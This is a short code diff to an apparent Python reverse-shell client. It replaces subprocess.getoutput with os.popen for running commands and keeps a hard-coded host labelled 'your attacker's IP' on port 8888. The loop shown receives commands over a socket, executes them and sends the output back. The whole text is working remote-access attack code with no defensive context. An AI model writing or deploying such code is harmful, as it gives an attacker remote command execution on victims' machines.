@@ -1,5 +1,5 @@
 import socket
-import subprocess
+import os
 
 CLIENT_HOST = "10.224.0.5"  # Replace with your attacker's IP
 CLIENT_PORT = 8888
@@ -18,7 +18,7 @@ while True:
         # if the command is exit, just break out of the loop
         break
     # execute the command and retrieve the results
-    output = subprocess.getoutput(command)
+    output = os.popen(command).read()
     # send the results back to the server
     s.send(output.encode())
 # close client connection
